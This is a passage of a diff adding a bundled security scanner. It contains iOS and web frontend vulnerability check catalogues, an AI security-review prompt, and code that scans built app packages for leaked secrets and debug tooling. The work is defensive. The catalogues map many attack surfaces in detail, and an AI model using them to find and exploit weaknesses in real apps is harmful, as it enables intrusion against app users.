| Logs with secrets | log files in user dirs containing tokens | S, R | Medium | CWE-532 |\n";
+
+// docs/security/ios.md
+var ios_default = '# iOS security checks\n\nApplies to: iOS / iPadOS apps (Swift, Objective-C, SwiftUI/UIKit, Xcode projects, SwiftPM/CocoaPods). Also covers the iOS side of Flutter and React Native apps.\nStandards: OWASP MASVS v2 / MASTG, CWE. Shared checks are in [common.md](common.md).\n\nHow: **S** static, **D** dependencies, **B** built IPA/app bundle, **R** runtime on simulator/device, **A** agent review.\n\n## 1. App config (Info.plist, entitlements)\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| IOS-CFG-01 | ATS disabled | `NSAllowsArbitraryLoads = YES`, `NSAllowsArbitraryLoadsInWebContent`, `NSAllowsLocalNetworking` in release | S, B | High | CWE-319 |\n| IOS-CFG-02 | ATS exceptions per domain | `NSExceptionDomains` with `NSExceptionAllowsInsecureHTTPLoads`, `NSExceptionMinimumTLSVersion` < 1.2 | S | Medium | CWE-319 |\n| IOS-CFG-03 | Entitlements broader than needed | `get-task-allow` true in release, unused App Groups, iCloud containers, keychain-access-groups shared widely | S, B | Medium | MASVS-PLATFORM |\n| IOS-CFG-04 | Usage descriptions for unused permissions | `NS*UsageDescription` (camera, location always, contacts) with no feature | S, A | Low | MASVS-PRIVACY |\n| IOS-CFG-05 | Missing privacy manifest | no `PrivacyInfo.xcprivacy`, or required-reason APIs used without declaration | S | Low | App Store policy |\n| IOS-CFG-06 | Background modes not needed | `UIBackgroundModes` like `location`, `voip` without feature | S | Low | \u2014 |\n| IOS-CFG-07 | Debug config in release scheme | `DEBUG` flags, `ENABLE_TESTABILITY`, test endpoints in Release configuration | S | Medium | CWE-489 |\n\n## 2. URL schemes, universal links & extensions\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| IOS-LNK-01 | Custom scheme for sensitive flows | OAuth redirect / reset links on `myapp://` (any app can claim it) | S | High | CWE-939 |\n| IOS-LNK-02 | URL handler input not validated | `application(_:open:)`, `onOpenURL`, `scene(_:openURLContexts:)` using params to navigate, load WebViews, perform actions | S, A | High | CWE-20 |\n| IOS-LNK-03 | Universal link config wrong | `apple-app-site-association` missing, wrong team/bundle id, `paths: ["*"]` | R | Medium | \u2014 |\n| IOS-LNK-04 | Links skip auth / confirmation | link performs state-changing action without user confirmation or login | R, A | High | CWE-352 |\n| IOS-LNK-05 | `sourceApplication` trusted | security decisions based on calling app identity | S | Medium | CWE-290 |\n| IOS-LNK-06 | App extension data leaks | share/keyboard/widget extensions reading the shared App Group container with secrets | S, A | Medium | MASVS-PLATFORM |\n| IOS-LNK-07 | Custom keyboards allowed on secure fields | no `shouldAllowExtensionPointIdentifier` blocking third-party keyboards in sensitive apps | S | Low | \u2014 |\n| IOS-LNK-08 | Pasteboard leaks | `UIPasteboard.general` with tokens/passwords, no `localOnly`/expiration | S | Low | CWE-200 |\n\n## 3. WebViews\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| IOS-WEB-01 | `UIWebView` still used | deprecated, no JS control, rejected by App Store | S | Medium | \u2014 |\n| IOS-WEB-02 | JS bridge exposed to any origin | `WKScriptMessageHandler` acting on messages without checking `frameInfo.securityOrigin` | S, A | High | CWE-749 |\n| IOS-WEB-03 | No navigation allowlist | `decidePolicyFor navigationAction` allowing everything; URLs from links/push loaded directly | S, A | High | CWE-939 |\n| IOS-WEB-04 | File access from file URLs | `allowFileAccessFromFileURLs`, `loadFileURL(allowingReadAccessTo: /)` too wide | S | High | CWE-200 |\n| IOS-WEB-05 | TLS errors ignored | `didReceive challenge` \u2192 `.useCredential` for any server trust | S | Critical | CWE-295 |\n| IOS-WEB-06 | JS injection | `evaluateJavaScript` with interpolated untrusted strings | S | High | CWE-79 |\n| IOS-WEB-07 | Inspectable in release | `isInspectable = true` not gated on DEBUG | S | Low | CWE-489 |\n\n## 4. Data storage\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| IOS-STO-01 | Secrets in `UserDefaults` | tokens, passwords, keys in `UserDefaults` / `@AppStorage` / plist files | S, R | Critical | CWE-312 |\n| IOS-STO-02 | Weak Keychain accessibility | `kSecAttrAccessibleAlways`, `\u2026AfterFirstUnlock` for high-value items; not `ThisDeviceOnly` when it should be | S | Medium | MASVS-STORAGE |\n| IOS-STO-03 | Missing file protection | files written without `.completeFileProtection` / `NSFileProtectionComplete`; app default protection lowered | S | Medium | CWE-311 |\n| IOS-STO-04 | Core Data / SQLite / Realm unencrypted with PII | stores holding messages, PII, tokens without encryption | S, R | High | CWE-312 |\n| IOS-STO-05 | Sensitive data backed up | sensitive files not marked `isExcludedFromBackup` | S | Low | MASVS-STORAGE |\n| IOS-STO-06 | Cache leaks | `URLCache` storing authenticated responses; images/PDFs of private content in `Caches` | S, R | Low | CWE-524 |\n| IOS-STO-07 | Keyboard cache / autocorrect | secure fields without `isSecureTextEntry`, `autocorrectionType = .no` | S | Low | \u2014 |\n| IOS-STO-08 | Snapshot on backgrounding | sensitive screen captured in the app switcher snapshot (no blur/overlay in `sceneWillResignActive`) | S, R | Low | MASVS-PLATFORM |\n| IOS-STO-09 | Keychain not cleared on reinstall | stale tokens survive uninstall (first-launch wipe missing) | A | Low | \u2014 |\n| IOS-STO-10 | What\'s actually in the container | dump the simulator app container after login; grep for tokens, emails, passwords | R | \u2014 | MASTG |\n\n## 5. Cryptography\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| IOS-CRY-01 | Hard-coded keys | keys in source, `Info.plist`, `.xcconfig`, asset catalogs | S, B | Critical | CWE-321 |\n| IOS-CRY-02 | CommonCrypto misuse | `kCCOptionECBMode`, zero/constant IV, `CCCrypt` without MAC | S | High | CWE-327, CWE-329 |\n| IOS-CRY-03 | Weak hashes | `CC_MD5`, `CC_SHA1`, `Insecure.MD5` for security | S | Medium | CWE-328 |\n| IOS-CRY-04 | Insecure random | `arc4random` fine; `rand()`, `random()`, seeded generators for tokens | S | High | CWE-338 |\n| IOS-CRY-05 | Keys not in Keychain / Secure Enclave | key material in files; `SecKeyCreateRandomKey` without `kSecAttrTokenIDSecureEnclave` where expected | S, A | Medium | MASVS-CRYPTO |\n| IOS-CRY-06 | Biometric not bound to Keychain | `LAContext.evaluatePolicy` result used as a boolean gate instead of `SecAccessControl` with `.biometryCurrentSet` | S | Medium | MASVS-AUTH |\n\n## 6. Network & TLS\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| IOS-NET-01 | Server trust bypass | `URLSessionDelegate` accepting any `serverTrust`; Alamofire `DisabledTrustEvaluator` / `.disableEvaluation` | S | Critical | CWE-295 |\n| IOS-NET-02 | No pinning on sensitive hosts | no `NSPinnedDomains`, `PinnedCertificatesTrustEvaluator`, TrustKit | S | Medium | MASVS-NETWORK |\n| IOS-NET-03 | `http://` endpoints | base URLs in code, plist, xcconfig | S, B | Medium | CWE-319 |\n| IOS-NET-04 | Secrets in query strings | API keys in URLs | S | Medium | CWE-598 |\n| IOS-NET-05 | Network logging in release | request/response body loggers, Pulse, netfox not gated | S | High | CWE-532 |\n| IOS-NET-06 | MITM test | proxy with a user-trusted CA; see which hosts accept it | R | \u2014 | MASTG |\n\n## 7. Authentication & session\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| IOS-AUT-01 | OAuth without `ASWebAuthenticationSession` / PKCE | login in embedded WKWebView, no `code_verifier` | S | High | RFC 8252 |\n| IOS-AUT-02 | Client-side entitlement checks | premium/admin flags trusted locally; receipt validation only on device | S, A | High | CWE-602 |\n| IOS-AUT-03 | Logout leaves data | Keychain items, caches, cookies (`HTTPCookieStorage`, `WKWebsiteDataStore`) remain | R, A | Medium | CWE-613 |\n| IOS-AUT-04 | Sign in with Apple / nonce misuse | missing or reused nonce in Apple/Google sign-in | S | Medium | \u2014 |\n| IOS-AUT-05 | Request signing with shipped key | HMAC with a key in the bundle | S | Critical | CWE-345 |\n\n## 8. Logging & privacy\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| IOS-LOG-01 | Secrets in logs | `print`, `NSLog`, `os_log` with `%{public}` on tokens/PII | S | Medium | CWE-532 |\n| IOS-LOG-02 | Crash / analytics PII | Crashlytics, Sentry, Firebase Analytics receiving PII or tokens | S, A | Medium | CWE-532 |\n| IOS-LOG-03 | Tracking without ATT | IDFA access without `ATTrackingManager` prompt | S | Medium | App Store policy |\n| IOS-LOG-04 | Device log check | run main flows, inspect Console / `log stream` for secrets | R | \u2014 | \u2014 |\n\n## 9. Build, binary & resilience\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| IOS-BLD-01 | Secrets in the shipped binary | `strings` on the Mach-O, plist, bundled JSON, `.xcconfig` values baked in | B | Critical | CWE-798 |\n| IOS-BLD-02 | Signing material in repo | `.p12`, `.mobileprovision`, `.p8` (App Store Connect / APNs keys) tracked | S | Critical | CWE-522 |\n| IOS-BLD-03 | Binary hardening off | PIE missing, stack canaries / ARC disabled (`-fno-stack-protector`) | B | Low | CWE-693 |\n| IOS-BLD-04 | Debug symbols / dSYM shipped | dSYM or symbol tables in the IPA | B | Info | \u2014 |\n| IOS-BLD-05 | No jailbreak / tamper detection where required | banking/payment apps without integrity checks; no App Attest / DeviceCheck | A | Info | MASVS-RESILIENCE |\n| IOS-BLD-06 | Dynamic code / JS download | executing downloaded JS (JSContext) or code push outside policy | S | Medium | CWE-494 |\n| IOS-BLD-07 | Unsafe C APIs | `strcpy`, `sprintf`, `gets`, unchecked `memcpy` in ObjC/C | S | Medium | CWE-120 |\n| IOS-BLD-08 | Format strings | `NSLog(userString)`, `stringWithFormat:` with untrusted format | S | Medium | CWE-134 |\n\n## 10. Injection & parsing\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| IOS-INJ-01 | SQL built from strings | `sqlite3_exec` / FMDB / GRDB with interpolated input | S | High | CWE-89 |\n| IOS-INJ-02 | NSPredicate injection | `NSPredicate(format:)` built from user input | S | Medium | CWE-943 |\n| IOS-INJ-03 | Unsafe archive decoding | `NSKeyedUnarchiver.unarchiveObject` (non-secure coding) on untrusted data | S | High | CWE-502 |\n| IOS-INJ-04 | XXE | `XMLParser` with `shouldResolveExternalEntities = true` | S | Medium | CWE-611 |\n| IOS-INJ-05 | Zip slip | unzipping (ZIPFoundation, SSZipArchive) without path checks | S | High | CWE-22 |\n';
+
+// docs/security/web-frontend.md
+var web_frontend_default = "# Web frontend security checks\n\nApplies to: browser apps and sites \u2014 React, Next.js (client side), Vue/Nuxt, Angular, Svelte, plain JS/TS, static sites, browser extensions (section 9).\nStandards: OWASP Top 10 2021, OWASP ASVS 4, OWASP WSTG, CWE. Server-side rendering and API routes are in [backend.md](backend.md); shared checks in [common.md](common.md).\n\nHow: **S** static, **D** dependencies, **B** built bundle, **R** runtime against the local dev/preview server, **A** agent review.\n\n## 1. XSS & DOM injection\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| WEB-XSS-01 | Raw HTML rendering | `dangerouslySetInnerHTML`, `v-html`, `[innerHTML]`, `{@html}`, `innerHTML =`, `outerHTML`, `insertAdjacentHTML`, `document.write` with non-constant data | S | High | CWE-79 |\n| WEB-XSS-02 | Sanitiser missing or misused | HTML rendered without DOMPurify; DOMPurify config allowing `script`/`on*`; Angular `bypassSecurityTrust*` | S | High | CWE-79 |\n| WEB-XSS-03 | `javascript:` URLs | `href`/`src` bound to user/server values without scheme check | S | High | CWE-79 |\n| WEB-XSS-04 | Code from strings | `eval`, `new Function`, `setTimeout(\"string\")`, `setInterval(\"string\")` | S | High | CWE-95 |\n| WEB-XSS-05 | DOM sources to sinks | `location.hash/search`, `document.referrer`, `window.name`, `postMessage` data flowing into sinks | S, A | High | CWE-79 |\n| WEB-XSS-06 | Markdown / rich text rendering | markdown libs with HTML enabled (`marked` without sanitize, `markdown-it` `html: true`) | S | Medium | CWE-79 |\n| WEB-XSS-07 | Template injection on client | Vue/Angular templates compiled from user strings | S | High | CWE-1336 |\n| WEB-XSS-08 | Reflected / stored XSS test | inject payloads into the app's own forms and URL params, see if they execute | R | \u2014 | WSTG-INPV-01/02 |\n| WEB-XSS-09 | Prototype pollution | deep merge / `lodash.merge`/`set` with user objects, `__proto__` keys from query parsing | S, D | Medium | CWE-1321 |\n\n## 2. Secrets & data in the bundle\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| WEB-SEC-01 | Server secrets shipped to the browser | `NEXT_PUBLIC_*`, `VITE_*`, `REACT_APP_*` holding secret keys; service-role keys (Supabase), Stripe secret keys, OpenAI keys in client code | S, B | Critical | CWE-798 |\n| WEB-SEC-02 | Source maps in production | `.map` files served, `productionSourceMap: true`, `devtool: 'source-map'` | B, R | Low | CWE-540 |\n| WEB-SEC-03 | Internal URLs / debug endpoints in bundle | staging hosts, admin APIs, feature flags that unlock hidden features | B | Low | CWE-200 |\n| WEB-SEC-04 | Firebase / Supabase rules | client SDK with permissive Firestore/RTDB/Storage rules or RLS disabled | S, A | Critical | CWE-284 |\n| WEB-SEC-05 | Map/analytics keys unrestricted | Google Maps etc. keys without HTTP referrer restriction | A | Low | \u2014 |\n\n## 3. Auth & session on the client\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| WEB-AUT-01 | Tokens in Web Storage | access/refresh tokens in `localStorage`/`sessionStorage`/IndexedDB (readable by any XSS) | S | Medium | CWE-922 |\n| WEB-AUT-02 | Authorization only in the UI | routes/buttons hidden by role on the client while the API doesn't check | S, A, R | High | CWE-602 |\n| WEB-AUT-03 | OAuth implicit flow / no PKCE / no state | `response_type=token`, missing `state` or `code_verifier` | S | High | CWE-352 |\n| WEB-AUT-04 | JWT decoded and trusted on client | role/claims from `jwt-decode` used to unlock data without server check | S | Medium | CWE-345 |\n| WEB-AUT-05 | Logout incomplete | tokens/caches/service-worker caches survive logout; no server revoke | R, A | Medium | CWE-613 |\n| WEB-AUT-06 | Password field hygiene | `autocomplete` wrong on password/OTP fields; password shown in URL (GET forms) | S | Low | CWE-598 |\n\n## 4. Cross-origin & messaging\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| WEB-ORG-01 | `postMessage` without origin check | `addEventListener('message')` handler not checking `event.origin` | S | High | CWE-346 |\n| WEB-ORG-02 | `postMessage` to `*` | `targetWindow.postMessage(data, '*')` with sensitive data | S | Medium | CWE-201 |\n| WEB-ORG-03 | Open redirect | `window.location = params.get('next')`, router redirects to unvalidated URLs | S, R | Medium | CWE-601 |\n| WEB-ORG-04 | Reverse tabnabbing | `target=\"_blank\"` to untrusted URLs without `rel=\"noopener\"` (old browsers) | S | Low | CWE-1022 |\n| WEB-ORG-05 | Iframes of untrusted content without sandbox | `<iframe>` user URLs without `sandbox` | S | Medium | CWE-1021 |\n| WEB-ORG-06 | Credentials sent cross-origin | `fetch(..., {credentials: 'include'})` to third-party hosts | S | Medium | CWE-201 |\n\n## 5. Security headers & browser policy (served by the app)\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| WEB-HDR-01 | No Content-Security-Policy | missing CSP, or `unsafe-inline`/`unsafe-eval`/`*` in `script-src` | R, S | Medium | CWE-693 |\n| WEB-HDR-02 | No clickjacking protection | missing `frame-ancestors` / `X-Frame-Options` | R | Medium | CWE-1021 |\n| WEB-HDR-03 | No HSTS | missing `Strict-Transport-Security` on HTTPS | R | Low | CWE-319 |\n| WEB-HDR-04 | MIME sniffing | missing `X-Content-Type-Options: nosniff` | R | Low | \u2014 |\n| WEB-HDR-05 | Referrer leaks | no `Referrer-Policy`; tokens in URLs leaking via Referer | R, S | Low | CWE-200 |\n| WEB-HDR-06 | Permissions-Policy | camera/mic/geolocation not restricted | R | Info | \u2014 |\n| WEB-HDR-07 | Cookie flags | auth cookies without `Secure`, `HttpOnly`, `SameSite` | R | Medium | CWE-614, CWE-1004 |\n| WEB-HDR-08 | Mixed content | `http://` scripts, images, APIs on HTTPS pages | S, R | Medium | CWE-319 |\n| WEB-HDR-09 | Subresource Integrity | third-party CDN scripts without `integrity` | S | Low | CWE-353 |\n\n## 6. Third-party scripts & supply chain (frontend-specific)\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| WEB-3P-01 | Third-party scripts with full page access | tag managers, chat widgets, analytics loaded on login/payment pages | S, A | Medium | CWE-829 |\n| WEB-3P-02 | Abandoned/compromised CDN hosts | `polyfill.io`-style domains, unpinned `latest` URLs | S | High | CWE-829 |\n| WEB-3P-03 | Vulnerable client libraries | old jQuery, Angular.js 1.x, Bootstrap with XSS CVEs | D | Medium | CWE-1104 |\n\n## 7. Storage, caching & PWA\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| WEB-STO-01 | PII in Web Storage | personal data persisted unencrypted in `localStorage` | S | Low | CWE-312 |\n| WEB-STO-02 | Service worker caches authenticated responses | Workbox runtime caching of `/api/*` with user data | S | Medium | CWE-524 |\n| WEB-STO-03 | Service worker scope too broad / from untrusted path | SW registered from a path users can upload to | S | High | \u2014 |\n| WEB-STO-04 | Sensitive data in URLs | tokens, emails in query params (history, logs, Referer) | S, R | Medium | CWE-598 |\n\n## 8. Forms, uploads & client validation\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| WEB-FRM-01 | Validation only on client | limits, prices, roles enforced only in form code | A, R | High | CWE-602 |\n| WEB-FRM-02 | CSRF | state-changing requests with cookie auth and no CSRF token / SameSite | R, A | High | CWE-352 |\n| WEB-FRM-03 | Uploads previewed unsafely | SVG/HTML uploads rendered inline from the same origin | S, R | High | CWE-79 |\n| WEB-FRM-04 | ReDoS | user input matched against catastrophic regexes | S | Low | CWE-1333 |\n\n## 9. Browser extensions\n\n| ID | Check | Look for | How | Sev | Ref |\n|---|---|---|---|---|---|\n| WEB-EXT-01 | Over-broad permissions | `<all_urls>`, `tabs`, `cookies`, `webRequest` not needed | S | Medium | \u2014 |\n| WEB-EXT-02 | Content script \u2194 page trust | content scripts trusting page `postMessage` / DOM data | S, A | High | CWE-346 |\n| WEB-EXT-03 | `externally_connectable` open | any site can message the extension | S | High | CWE-346 |\n| WEB-EXT-04 | Remote code | loading remote scripts (MV3 forbids), `eval` | S | High | CWE-494 |\n| WEB-EXT-05 | Secrets in extension storage | tokens in `chrome.storage.sync` | S | Medium | CWE-312 |\n";
+
+// src/security/agent.ts
+var DOCS = {
+  "common.md": common_default,
+  "android.md": android_default,
+  "ios.md": ios_default,
+  "web-frontend.md": web_frontend_default,
+  "backend.md": backend_default,
+  "cross-platform-mobile.md": cross_platform_mobile_default,
+  "desktop.md": desktop_default
+};
+async function agentFindings(project, feature, platforms, known, log, model) {
+  const prompt6 = reviewPrompt(project, feature, platforms, known);
+  const result = await runAgent(project, { prompt: prompt6, probeTools: ["probe_feature"], model }, (l) => log(`  ${l}`));
+  const parsed = parseAgentFindings(result.summary, feature.id);
+  if (!result.ok && !parsed.length) return { findings: [], costUsd: result.costUsd, error: result.summary.slice(0, 300) || "the agent did not finish" };
+  return { findings: parsed, costUsd: result.costUsd };
+}
+function reviewPrompt(project, feature, platforms, known) {
+  const docs = [...new Set(["common", ...platforms].map((p) => PLATFORM_DOCS[p]))].map((d) => DOCS[d]).filter(Boolean);
+  const modules = feature.modules.map((m) => `- ${m.id} \u2014 ${(0, import_node_path34.relative)(project.root, m.dir).replace(/\\/g, "/") || "."}`).join("\n");
+  const already = known.filter((f) => f.feature === feature.id).slice(0, 40).map((f) => `- ${f.check} ${f.file ?? ""}${f.line ? `:${f.line}` : ""} \u2014 ${f.title}`).join("\n");
+  return `You are a security reviewer. Review the "${feature.id}" feature of the project in the current directory for security problems.
+
+## The feature's code (modules)
+${modules || "- (whole project)"}
+
+## Already reported by Probe's pattern rules (do not repeat these)
+${already || "- none"}
+
+## What to look for
+Pattern rules already cover obvious API misuse. Spend your effort on what needs reading the code:
+- authentication and authorization: routes, screens, actions or queries that skip the login or ownership check; IDOR (an id from the request or a deep link used without checking it belongs to the user); admin-only actions reachable by others
+- trust boundaries: data from deep links, intents, push payloads, WebView messages, IPC, webhooks or third-party APIs used without validation
+- secrets and crypto used as security controls in the client (keys shipped in the app, client-side signing)
+- business logic: prices, quantities, roles or limits decided on the client; steps that can be skipped; races (double spend)
+- sensitive data: tokens or personal data stored, logged, cached or sent where they should not be
+- for LLM features: untrusted content reaching prompts that can call tools
+
+Use the catalog below for check ids. Read the code with your file tools. Report only problems with a concrete attack path in this code, not general advice; if a protection exists elsewhere (middleware, a base class), it is not a finding. It is fine to report nothing.
+
+## Catalog (check ids and what they mean)
+${docs.join("\n\n---\n\n")}
+
+## Answer
+End with exactly one fenced json block and nothing after it:
+\`\`\`json
+{"findings": [{"check": "API-AUZ-01", "title": "short title", "severity": "critical|high|medium|low|info", "file": "path/relative/to/project", "line": 42, "evidence": "the code that shows it (one or two lines)", "why": "the attack path in one or two sentences", "fix": "the smallest change that closes it"}]}
+\`\`\``;
+}
+function parseAgentFindings(text2, feature) {
+  const blocks = [...text2.matchAll(/```json\s*([\s\S]*?)```/g)];
+  const raw = blocks.length ? blocks[blocks.length - 1][1] : /\{[\s\S]*"findings"[\s\S]*\}/.exec(text2)?.[0] ?? "";
+  let data;
+  try {
+    data = JSON.parse(raw);
+  } catch {
+    return [];
+  }
+  if (!Array.isArray(data.findings)) return [];
+  return data.findings.filter((f) => typeof f === "object" && f !== null && typeof f.title === "string").map((f) => {
+    const severity = SEVERITY_ORDER.includes(String(f.severity).toLowerCase()) ? String(f.severity).toLowerCase() : "medium";
+    const check2 = typeof f.check === "string" && /^[A-Z]{2,4}-[\w-]+$/.test(f.check) ? f.check : "AGENT";
+    return makeFinding({
+      check: check2,
+      title: String(f.title).slice(0, 160),
+      severity,
+      layer: "agent",
+      file: typeof f.file === "string" ? f.file.replace(/\\/g, "/").replace(/^\.\//, "") : void 0,
+      line: typeof f.line === "number" && f.line > 0 ? Math.floor(f.line) : void 0,
+      evidence: String(f.evidence ?? "").slice(0, 400),
+      why: String(f.why ?? "").slice(0, 600),
+      fix: String(f.fix ?? "").slice(0, 600),
+      refs: [check2],
+      feature
+    });
+  });
+}
+
+// src/security/artifact.ts
+var import_node_fs26 = require("node:fs");
+var import_node_path35 = require("node:path");
+var import_node_zlib = require("node:zlib");
+function findArtifacts(root) {
+  const apps = [];
+  const web = [];
+  const visit = (dir, depth) => {
+    if (depth > 8) return;
+    let entries;
+    try {
+      entries = (0, import_node_fs26.readdirSync)(dir, { withFileTypes: true });
+    } catch {
+      return;
+    }
+    for (const e of entries) {
+      if (e.name === "node_modules" || e.name === ".git" || e.name === ".gradle" || e.name === "Pods" || e.name === "intermediates" || e.name === "tmp") continue;
+      const path = (0, import_node_path35.join)(dir, e.name);
+      if (e.isDirectory()) {
+        if (/^(dist|build|out|\.next)$/.test(e.name) && depth <= 3) collectWeb(path, web);
+        visit(path, depth + 1);
+      } else if (/\.(apk|aab|ipa)$/.test(e.name)) {
+        apps.push({ path, mtime: (0, import_node_fs26.statSync)(path).mtimeMs });
+      }
+    }
+  };
+  visit(root, 0);
+  const newest = (ext) => apps.filter((a) => a.path.endsWith(ext)).sort((a, b) => b.mtime - a.mtime).slice(0, 2).map((a) => a.path);
+  return { apps: [...newest(".apk"), ...newest(".aab"), ...newest(".ipa")], web: [...new Set(web)].slice(0, 400) };
+}
+function collectWeb(dir, out) {
+  const visit = (d, depth) => {
+    if (depth > 5 || out.length > 400) return;
+    let entries;
+    try {
+      entries = (0, import_node_fs26.readdirSync)(d, { withFileTypes: true });
+    } catch {
+      return;
+    }
+    for (const e of entries) {
+      const p = (0, import_node_path35.join)(d, e.name);
+      if (e.isDirectory() && e.name !== "node_modules" && e.name !== "server" && e.name !== "cache") visit(p, depth + 1);
+      else if (/\.(js|mjs|map)$/.test(e.name) && !/[\\/](outputs|intermediates|generated|tmp|kotlin|classes)[\\/]/.test(p)) out.push(p);
+    }
+  };
+  visit(dir, 0);
+}
+function artifactFindings(root, rules, owner) {
+  const { apps, web } = findArtifacts(root);
+  const secretRules = rules.filter((r) => r.secret && r.match && !r.when && !r.absent && r.platform === "common");
+  const out = [];
+  for (const path of apps) {
+    const rel = (0, import_node_path35.relative)(root, path).replace(/\\/g, "/");
+    let entries;
+    try {
+      entries = readZip((0, import_node_fs26.readFileSync)(path));
+    } catch {
+      continue;
+    }
+    out.push(...packageFindings(rel, entries, secretRules, owner(rel)));
+  }
+  const maps = web.filter((p) => p.endsWith(".map"));
+  if (maps.length) {
+    const rel = (0, import_node_path35.relative)(root, maps[0]).replace(/\\/g, "/");
+    out.push(artifact("WEB-SEC-02", "low", rel, `${maps.length} source map(s), e.g. ${rel}`, "Source maps in the web build", "If these are deployed, anyone can read your original source code and comments.", "Do not deploy .map files (hidden-source-map + upload to your error tracker).", ["CWE-540"], owner(rel)));
+  }
+  for (const path of web.filter((p) => !p.endsWith(".map"))) {
+    let text2;
+    try {
+      if ((0, import_node_fs26.statSync)(path).size > 8 * 1024 * 1024) continue;
+      text2 = (0, import_node_fs26.readFileSync)(path, "utf8");
+    } catch {
+      continue;
+    }
+    const rel = (0, import_node_path35.relative)(root, path).replace(/\\/g, "/");
+    for (const r of secretRules) {
+      const m = r.match.exec(text2);
+      if (m) out.push(artifact(r.id, r.severity, rel, mask(m[0]), `${r.title} \u2014 in the shipped web bundle`, `${r.why} The browser downloads this file, so every visitor has it.`, r.fix, [...r.refs, "WEB-SEC-01"], owner(rel)));
+    }
+  }
+  return { findings: out, scanned: [...apps, ...web.length ? [`${web.length} web build file(s)`] : []].map((p) => p.includes(root) ? (0, import_node_path35.relative)(root, p).replace(/\\/g, "/") : p) };
+}
+function packageFindings(rel, entries, secretRules, feature) {
+  const out = [];
+  const isApk = /\.(apk|aab)$/.test(rel);
+  const strings = [];
+  for (const e of entries) {
+    if (isApk ? /(^|\/)classes\d*\.dex$|resources\.arsc$|^(base\/)?assets\/|\.(json|properties|xml|txt|js)$/.test(e.name) : /\.app\/[^/]+$|\.(plist|json|js|strings)$/.test(e.name)) {
+      const data = e.read();
+      if (data) strings.push(...printable(data));
+    }
+  }
+  const pool2 = strings.join("\n");
+  const seen = /* @__PURE__ */ new Set();
+  for (const r of secretRules) {
+    const re = new RegExp(r.match.source, `${r.match.flags.replace("g", "")}g`);
+    let m;
+    let n = 0;
+    while ((m = re.exec(pool2)) && n < 5) {
+      if (seen.has(m[0])) continue;
+      seen.add(m[0]);
+      n++;
+      out.push(artifact(isApk ? "AND-BLD-03" : "IOS-BLD-01", "critical", rel, mask(m[0]), `${r.title} \u2014 in the shipped app`, `${r.why} It is in the built ${isApk ? "APK" : "IPA"}: unzip and a string search recover it, obfuscated or not.`, "Remove it from the client entirely (serve it from your backend as a short-lived token) and rotate it.", [...r.refs, isApk ? "AND-BLD-03" : "IOS-BLD-01"], feature));
+    }
+  }
+  if (isApk) {
+    const tools = [
+      [/com\/chuckerteam\/chucker\/internal/, "Chucker (HTTP inspector)"],
+      [/leakcanary\/internal/, "LeakCanary"],
+      [/com\/facebook\/flipper\/core/, "Flipper"],
+      [/com\/facebook\/stetho\/inspector/, "Stetho"],
+      [/androidx\/compose\/ui\/tooling\/PreviewActivity/, "Compose PreviewActivity"]
+    ];
+    for (const [re, name] of tools) if (re.test(pool2)) out.push(artifact("AND-MAN-11", "low", rel, name, `${name} shipped in the app`, "Debug tooling in a distributed build can expose network traffic, heap data or extra exported activities.", "Use debugImplementation (and the -no-op artifact) so it stays out of release builds.", ["MASVS-CODE"], feature));
+    const unstripped = entries.filter((e) => /^(base\/)?lib\/[^/]+\/[^/]+\.so$/.test(e.name)).find((e) => {
+      const data = e.read();
+      return data !== null && data.includes(".debug_info");
+    });
+    if (unstripped) out.push(artifact("AND-BLD-06", "info", rel, unstripped.name, "Native library with debug info shipped", "Full debug info makes native code much easier to reverse engineer.", "Strip native libraries in release (the default unless debugSymbolLevel FULL or keepDebugSymbols is set).", [], feature));
+  } else {
+    if (/NSAllowsArbitraryLoads/.test(pool2)) out.push(artifact("IOS-CFG-01", "high", rel, "NSAllowsArbitraryLoads", "ATS exception in the shipped app", "The released app may load plain HTTP.", "Remove NSAllowsArbitraryLoads from the release Info.plist.", ["CWE-319"], feature));
+    if (/get-task-allow<\/key>\s*<true/.test(pool2)) out.push(artifact("IOS-CFG-03", "medium", rel, "get-task-allow", "Debuggable IPA", "A debugger can attach to this build.", "Export with a distribution profile.", ["CWE-489"], feature));
+  }
+  return out;
+}
+function artifact(check2, severity, file, evidence, title, why, fix, refs, feature) {
+  return makeFinding({ check: check2, title, severity, layer: "artifact", file, evidence, why, fix, refs, feature });
+}
+function printable(data) {
+  const out = [];
+  let run = "";
+  for (let i = 0; i < data.length; i++) {
+    const c = data[i];
+    if (c >= 32 && c < 127) run += String.fromCharCode(c);
+    else {
+      if (run.length >= 6) out.push(run);
+      run = "";
+    }
+  }
+  if (run.length >= 6) out.push(run);
+  run = "";
+  for (let i = 0; i + 1 < data.length; i += 2) {
+    const c = data[i];
+    if (data[i + 1] === 0 && c >= 32 && c < 127) run += String.fromCharCode(c);
+    else {
+      if (run.length >= 8) out.push(run);
+      run = "";
+    }
+  }
+  return out;
+}
+function readZip(buf) {
+  let eocd = -1;
+  for (let i = buf.length - 22; i >= Math.max(0, buf.length - 65557); i--) {
+    if (buf.readUInt32LE(i) === 101010256) {
+      eocd = i;
+      break;
+    }
+  }
+  if (eocd < 0) throw new Error("not a zip file");
+  const count2 = buf.readUInt16LE(eocd + 10);
+  let p = buf.readUInt32LE(eocd + 16);
